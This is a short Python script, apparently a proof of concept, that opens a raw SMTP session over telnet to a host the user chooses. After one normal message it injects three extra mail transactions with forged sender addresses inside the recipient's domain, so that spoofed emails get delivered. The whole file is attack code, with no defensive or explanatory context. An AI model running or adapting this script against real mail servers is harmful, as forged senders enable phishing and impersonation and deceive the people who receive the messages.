import telnetlib
import time

host = input("Enter host: ")
port = int(input("Enter port: "))

tn = telnetlib.Telnet(host, port)
tn.read_until(b"220")

tn.write(b"HELO " + host.encode() + b"\r\n")
tn.read_until(b"250")

tn.write(b"MAIL FROM: <duy@validedomain.com>\r\n")
tn.read_until(b"250")

tn.write(b"RCPT TO: <validrecipient@validerecipientdomain.com>\r\n")
tn.read_until(b"250")

tn.write(b"data\r\n")
tn.read_until(b"354")

email_content = """From: duy@validedomain.com
To: validrecipient@validerecipientdomain.com
Subject: 1st email

1st email content with many others emails
."""

tn.write(email_content.encode() + b"\r\n")
tn.read_until(b"250")

for i in range(1, 4):
    spoofed_email = f"""mail FROM:<spoofedvalidrecipient#{i}@validerecipientdomain.com>
rcpt TO:<validrecipient#{i}@validerecipientdomain.com>
data\r
From: spoofedvalidrecipient#{i}@validerecipientdomain.com
To: validrecipient#{i}@validerecipientdomain.com
Subject: Spoofed email #{i}

Content of the #{i} spoofed email
."""
    tn.write(spoofed_email.encode() + b"\r\n")
    tn.read_until(b"250")

tn.write(b"quit\r\n")

tn.close()
